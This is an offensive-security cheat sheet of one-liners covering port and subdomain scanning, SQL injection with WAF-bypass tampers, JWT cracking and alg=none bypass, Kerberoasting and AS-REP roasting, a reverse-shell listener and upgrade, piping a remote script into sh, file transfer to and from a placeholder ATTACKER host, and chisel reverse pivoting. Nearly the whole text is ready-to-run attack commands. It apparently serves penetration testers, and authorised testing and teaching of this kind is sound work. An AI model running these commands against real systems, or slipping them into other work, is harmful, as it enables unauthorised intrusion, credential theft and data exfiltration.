# Common One-Liners & Quick Commands

## Recon

### Fast port scan + service detection (two-stage)

```bash
# Stage 1: fast port discovery
masscan --rate 1000 -p1-65535 TARGET -oG masscan.gnmap
# Stage 2: deep service scan on found ports
PORTS=$(grep "Ports:" masscan.gnmap | grep -oP '\d+/open' | tr '\n' ',' | tr -d ' ' | sed 's/,$//')
nmap -sV -sC -p "$PORTS" TARGET
```

### Subdomain enumeration pipeline

```bash
# Passive from multiple sources
subfinder -d DOMAIN -all -recursive -o subfinder.txt
amass enum -passive -d DOMAIN -o amass.txt
curl -s "https://crt.sh/?q=%25.DOMAIN&output=json" | jq -r '.[].name_value' | sed 's/\*\.//' | sort -u > crtsh.txt
cat subfinder.txt amass.txt crtsh.txt | sort -u > all-subs.txt
# Resolve and probe
dnsx -l all-subs.txt -a -o resolved.txt
httpx -l resolved.txt -mc 200,301,302,401,403 -status-code -title -tech-detect -o live-http.txt
```

### Full web content discovery pipeline

```bash
# Directory brute + crawl + URL collection
feroxbuster -u https://TARGET --depth 2 -o feroxbuster.txt
gau TARGET > gau-urls.txt
katana -u https://TARGET -mode active -jc -d 3 -o katana.txt
# Merge and dedupe
cat feroxbuster.txt gau-urls.txt katana.txt | sort -u > all-urls.txt
# Extract interesting params
cat all-urls.txt | grep -E '\?(\w+)= ' | grep -oP '\?(\w+)=' | sort -u
```

## Web

### Nuclei full scan

```bash
nuclei -u https://TARGET -t cves/ -t technologies/ -t misconfiguration/ -t exposures/ \
  -severity high,critical -o nuclei-high.txt
```

### SQLi quick check

```bash
# Single URL
sqlmap -u "https://TARGET/page?id=1" --batch --level 3 --risk 2 --dbs
# From a request file (captured with Burp)
sqlmap -r request.txt --batch --level 5 --risk 3 --dbs
# With tamper scripts for WAF bypass
sqlmap -u "https://TARGET/page?id=1" --batch --tamper=space2comment,between,randomcase
```

### ffuf common patterns

```bash
# Directory brute
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,401,403 -recursion -recursion-depth 2 -o ffuf-dirs.json

# File extension brute
ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -e .php,.html,.txt,.bak,.old,.zip -mc 200,301,302,401,403

# Vhost discovery
ffuf -u https://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -H "Host: FUZZ.TARGET" -mc 200,301,302,401,403

# Parameter discovery
ffuf -u "https://TARGET/page?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,500 -fs <original-size>
```

### JWT analysis

```bash
# Decode
echo "eyJ..." | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .
# Crack weak secret
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
# alg=none bypass
jwt_tool TOKEN -X a
```

## Network

### SMB enumeration quick set

```bash
enum4linux-ng -A TARGET
smbclient -L //TARGET -N
netexec smb TARGET -u '' -p '' --shares
netexec smb TARGET -u 'guest' -p '' --shares
```

### AD attack chain (with creds)

```bash
# 1. BloodHound collection
bloodhound-python -d DOMAIN -u USER -p PASS -ns DC_IP -c All -o bh/
# 2. Kerberoasting
GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS -request -outputfile hashes.kerberoast
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
# 3. AS-REP roasting
GetNPUsers.py -dc-ip DC_IP DOMAIN/ -usersfile users.txt -outputfile hashes.asrep
hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt
# 4. ADCS misconfig
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -bloodhound
```

## Post-Exploitation

### Reverse shell upgrade

```bash
# Catch with rlwrap for history + arrow keys
rlwrap nc -lvnp 4444
# After connecting, upgrade to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

### Quick privesc check

```bash
# LinPEAS
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas.txt
# Manual quick checks
sudo -l; id; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null; cat /etc/crontab; ls -la /etc/cron.*
```

### File transfer

```bash
# HTTP server (attacker)
python3 -m http.server 8000
# Download (target)
wget http://ATTACKER:8000/file
curl -O http://ATTACKER:8000/file
# Netcat transfer (attacker)
nc -lvnp 4444 > file.bin  # receiver
nc ATTACKER 4444 < file.bin  # sender
# Base64 encode for clipboard
base64 file.bin | tr -d '\n'; echo
```

## Session Management

### tmux for pentest sessions

```bash
# New named session
tmux new -s pentest
# Split panes: Ctrl+B then % (vertical) or " (horizontal)
# Detach: Ctrl+B then D
# Reattach
tmux attach -t pentest
# List sessions
tmux ls
```

### Record session with script

```bash
# Start recording
script -q session.log
# Stop: exit
# The file session.log contains all terminal output
```

## Proxy & Routing

### proxychains setup

```bash
# Edit /etc/proxychains4.conf
# socks5 127.0.0.1 9050  # for Tor
# socks5 127.0.0.1 1080  # for SSH tunnel
# Run tools through proxy
proxychains nmap -sT -Pn TARGET
proxychains curl https://TARGET
```

### SSH tunnel as SOCKS proxy

```bash
# Dynamic port forwarding (SOCKS5 on 1080)
ssh -D 1080 user@jump-host
# Then use with proxychains
```

### Chisel pivot

```bash
# On attacker (server)
chisel server -p 8080 --reverse
# On target (client)
chisel client ATTACKER:8080 R:socks
# Use socks5://127.0.0.1:1080 with proxychains
```
